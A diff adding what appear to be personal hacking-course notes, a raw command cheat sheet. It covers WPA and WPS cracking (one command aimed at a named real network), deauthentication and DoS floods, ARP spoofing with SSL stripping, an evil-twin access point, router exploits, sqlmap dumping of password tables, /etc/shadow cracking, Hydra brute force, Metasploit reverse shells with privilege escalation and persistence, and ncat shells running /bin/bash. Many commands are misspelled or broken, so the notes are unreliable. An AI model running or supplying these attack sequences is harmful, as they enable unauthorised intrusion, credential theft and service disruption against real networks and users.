@@ -1,0 +1,431 @@
+'''
+Demonstration of Power: Aircrack-ng and Crunch
+ifconfig wlo1 down
+iwconfig wlo1 mode monitor
+ifconfig wlo1 up
+airmon-ng check kill
+airodump-ng wlo1
+airodump-ng -w capture -c 11 --bssid [mac-addr]
+aireplay-ng -0 0 -a [mac] wlo1
+crunch 12 12 -t sweetship@@@ | aircrack-ng -w - capture-01.cap -e Nestaway_C105
+'''
+
+adduser #to create the new user
+
+Stay annoynomous:-
+
+nano /etc/proxychains.conf
+#uncimment 'dynamic chain' and comment 'strictchain'
+socks5 'ip'
+service tor status
+service tor start
+proxychains firefox www.duckduckgo.com
+#browse check for dns leaks
+service tor stop
+service tor restart
+proxychains nmap'''''''
+
+
+#free socks5 proxy
+nano /etc/proxychains.conf
+socks5 'ip'
+
+VPN
+apt-get install network-manager-openvpn-gnome -y
+apt-get install network-manager-pptp -y
+apt-get install network-manager-pptp-gnome -y
+apt-get install network-manager-strongswan -y
+apt-get install network-manager-vpnc -y
+apt-get install network-manager-vpnc-gnome -y
+
+#vpnbook.com->openvpn
+cd /root/deskstop/openvpn
+ls -l
+openvpn --config 'name'
+nano /etc/resolv.conf
+#comment orginal nameserver and enter new nameserver from openDNS.com
+
+Macchanger
+ifconfig eth0
+ifconfig | grep HWaddr
+macchanger --help
+macchanger -r eth0
+
+crontab --help
+crontab -e
+@reboot macchanger -r etho
+:wq
+Reboot pc
+ifconfig
+macchanger -s eth0
+
+Footprinting and Nmap:-
+nmap --help
+nslookup 'domain name'
+nslookup 'ip'
+
+nmap 'target domain name' -vv
+nmap -oG - 192.168.1.0-255 -p 22 -vv > /home/SCAN
+cd /home
+ls
+ls | grep SCAN
+less scan
+cat scan
+cat SCAN | grep Up
+cat SCAN | grep Up | awk -F " " {print $2}
+cat SCAN | grep Up | awk -F " " {print $2} > SCAN2
+nmap -iL SCAN2
+nmap -iL SCAN2 -vv
+
+External nmap resources:-
+curl ipinfo.io/'ip'
+#exploit db
+
+Wifi cracking:-
+#crunch password generator
+
+ifconfig
+ifconfig wlp2s0 down
+ifconfig wlp2s0 mode monitor
+ifconfig wlp2s0 up
+airmon-ng check wlp2s0
+kill 1312
+airmon-ng check wlp2s0
+airodump-ng wlp2s0
+air
+airodump-ng -c 6 -w SCAN-test --bssid 'target id' wlp2s0
+airplay-ng -0 0 -a 'id' wlp2s0
+
+crunch -F
+crunch 11 11 -t %%%Thunder 1234567890 | airtrack-ng -w -SCAN_test01.cap -e 'wifi name'
+crunch 11 11 -t %%%,@@@@der -f charset.list ' type password' | airtrack-ng -w -SCAN_test01.cap -e 'wifi name'
+
+
+Reaver:-
+reaver --help
+ifconfig
+ifconfig wlp2s0 down
+route
+ifconfig wlp2s0 mode monitor
+ifconfig wlp2s0 up
+airmon-ng check wlp2s0
+kill 1312
+airmon-ng check wlp2s0
+service NetworkManager restart
+wash -i wlp2s0
+mkdir /etc/reaver
+airodump-ng wlp2s0
+reaver -b 'bssid' -i wlp2s0 -c 6 -vv
+
+
+less monitor.sh
+ifconfig wlp2s0 down
+iwconfig wlp2s0 mode monitor
+ifconfig wlp2s0 up
+iwconfig wlp2s0 | grep mode
+./monitor.sh
+service NetworkManager stop
+wash -i wlp2s0
+reaver -i wlp2s0 -b 'bssid' -c 6 -r 2:60 -vv
+
+Jamming signals and dos attack:-
+
+ifconfig wlp2s0 down
+iwconfig wlp2s0 mode monitor
+ifconfig wlp2s0 up
+iwconfig wlp2s0 | grep mode
+airmon-ng check wlp2s0
+kill 1312
+airodump-ng wlp2s0
+airplay-ng --help
+iwconfig wlp2s0 channel 6
+airplay-ng -0 0 -a 'id' wlp2s0
+
+
+
+
+
+
+airodump-ng wlp2s0
+airodump-ng --bssid 'id' wlp2s0
+airodump-ng --bssid 'id' --channel 6 wlp2s0 
+
+
+
+
+
+SSL stripping and ARP spoofing:-
+1.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING
+ifconfig
+ifconfig tatget
+route
+nmap ip/2-254 -vv
+-Pn
+-o
+
+2.
+arpspoof -i wlp2s0 -t 'rputer ip' -r 'target ip'
+arpspoof -i wlp2s0 -t 'target ip' -r 'router ip'
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+iptables -I INPUT
+tail -f sslstrip.log
+
+
+Funny things:-
+apt-cache search squid3
+apt-get install squid3 -y
+apt-cache search apache
+apt-get install apache2
+apt-get -y install imagemagick ghostscript jp2a
+
+
+googlesearch.pl
+nano googleSearch.pl
+chmod +x googleSearch.pl
+nano asciiImages.pl
+ifconfig
+nano /etc/squid3/squid.conf
+#search for 'acl localnet src' then uncomment depends on u
+#search for 'http_access allow localnet' then uncomment it
+#search for 'http_port 3128' then type transparent
+#search for 'url_rewrite program /root/googleSearch.pl' then write it
+service squid3 restart
+iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+mkdir /var/www/tmp
+chmod 777 /var/www/tmp
+service apache2 restart
+
+arpspoof -i eth0 -t "default gateway" -r 'victim ip' 
+
+
+
+Evil Twin:-
+ifconfig wlp2s0 down
+iwconfig wlp2s0 mode monitor
+airmon-ng check wlp2s0
+kill 
+airodump-ng wlp2s0
+airbase-ng -a 'MAC' --essid "name" -c 'name' wlp2s0
+airplay-ng -0 0 -a 'mac'wlp2s0
+
+
+bridge-utils
+brctl-addbr evil
+brctl addif evil p81
+brcrl addif evil at0
+ifconfig at0.0.0.0.0 up
+if config evil up
+dhclient3 evil & #incase it didnt work remove 3 and &
+
+yum search wireshark
+
+
+Router Vulnerabilities:-
+rout
+nmap 'default'
+wget http://
+less rom-0
+ls ZteRomReader.py
+chmod +x NAME OF THE FILE
+./zteRomReader.py rom-0
+
+
+go to nmap.org
+locate *.nse
+cd/
+ls
+ls file name 
+cat
+touch name of the file
+ls
+nano paste the new file
+/
+nmap -80 --script http-tplink-dir-traversal.nse --script-args rfile=/tmp/ath0.ap_bss -d -n -Pn <target>
+
+
+
+Social engineering:-
+dnschef --fakeip='ip' --fakedimains=randomNames.com --interface='ip'
+setoolkit
+nslookup ''
+Ping ''
+
+cd var/www/
+ls
+cd tmp/
+ls
+tail -f 'file name'
+
+SQL injection:-
+cp -Rv /home/test/downloads/DVWA-1.0.8
+chmod -Rv 777 /var/www/DVWA-1.0.8/
+apt-cache search mysql | grep -i database | less
+apt-get install mysql-client
+#apt-get install mysql-server
+service mysql start
+service mysql restart
+mysql -h localhost -u root #if ur 1st time
+SET PASSWORD FOR root@localhost=PASSWORD('test')
+;
+mysql -h localhost -u root -p
+exit
+
+cd /var/www/DVWA-1.0.8/
+ls
+cd config/
+ls
+nano config.inc.php
+db_password =test
+su to become root
+
+service mysql status
+service mysql start
+service apache2 restart
+
+Brute suite basics:-
+
+if config
+cd /var/www/
+cd DVWA-1.0.8/
+ls
+less 'file name'
+
+su
+burpsuit
+sqlmap -u '"url"' --cookie='"security=high; PHPSESSID="'
+
+sqlmap -u '"url"' --cookie='"security=; PHPSESSID="' --dbs
+
+sqlmap -u '"url"' --cookie='"security=; PHPSESSID="' -D dvwa --tables
+
+sqlmap -u '"url"' --cookie='"security=; PHPSESSID="' -T user --column
+
+sqlmap -u '"url"' --cookie='"security=; PHPSESSID="' -C user,password --dump
+
+
+Introduction to craking hashes:-
+findmyhash --help
+findmyhash MD5 -h 'your hash'
+
+John the reaper:-
+cat/etc/shadow
+unshadow /etc/passwd/etc/shadow > 'file'
+ls
+cat 'file'
+John
+john pass
+john --show file
+
+Hydra :-
+nano 'file name' #create password list yoursef 
+hydra -l admin -p 'file name' 'web ip' http-post-form "web site:username=^USER^&password=^PASS^&Login=Login:Login faild" -V
+
+Dos :-
+hping3
+hping3 -i u100 -S -p 80 'target ip'
+
+nmap --script http-slowloris --max-parallelism 400 'target ip' -vv
+./'script name' -dns 'target ip' -port 80 -num 500
+
+Metasploit and reverse shells :-
+ifconfig
+DMZ
+service postgresql start
+service postgresql status
+service metasploit start
+service metasploit status
+
+msfconsole
+msfupdate
+help
+search
+db_rebuild_cache
+search -h
+search name:meterpreter
+
+
+msfpayload windows/meterpreter/reverse_tcp LHOST='own ip' x >/root/Desktop/CMD.exe
+
+use exploit/multi/handler
+show options
+set payload/windows/meterpreter/reverse_tcp
+show options
+set Lhost 'my ip'
+show options
+exploit
+sessions -l
+sessions -i 5
+   ^
+   |
+Escalating Privilleges on another system:-
+
+getsystem
+shell
+sessions -h
+sessions -l
+sessions -i 5or'id'
+use post/windows/
+use post/windows/escalate/
+use post/windows/local/ask
+show options
+set session 5
+show options
+exploit
+getsystem
+mkdir test1
+background
+   ^
+   |
+Creating persistent reverse shell with metasploit
+sessions -l
+sessions -i 6
+run persistence -h
+run persistence -X
+#to shutdown windows 'shutdown /r /t 0
+
+use exploit/multi/handler
+show options
+exploit
+shell
+cd..
+
+Creating reverse shells with netcat
+
+ncat --help
+ncat -v -l -p port 8888 -e /bin/bash
+ncat -v -l -p port 8888 -e /bin/bash &
+nmap localhost
+ifconfig
+ncat -v -l -p port 8888 -e /bin/bash &
+kill 6549
+lsof -i :8888
+nmap localhost
+ncat --help
+ncat --chat -p 8888
+ncat -l -p 8888
+#on other hand ncat 'ip' 8888
+ncat --ssl -l -p 8888
+# ooh ncat -ssl 'ip' 8888
+ncat --ssl -l -k -p 8888#for multiple user
+#ncat --ssl 8888
+
+Uploading a reverse shell to a web server:-
+
+nmap -sV --script=http-php-version <target>
+php
+php -v
+#go to web download 'pentestmonkey php reverse shell'
+burpsuit
+ncat -v -l -p 1234
+ls
+
+
+
+
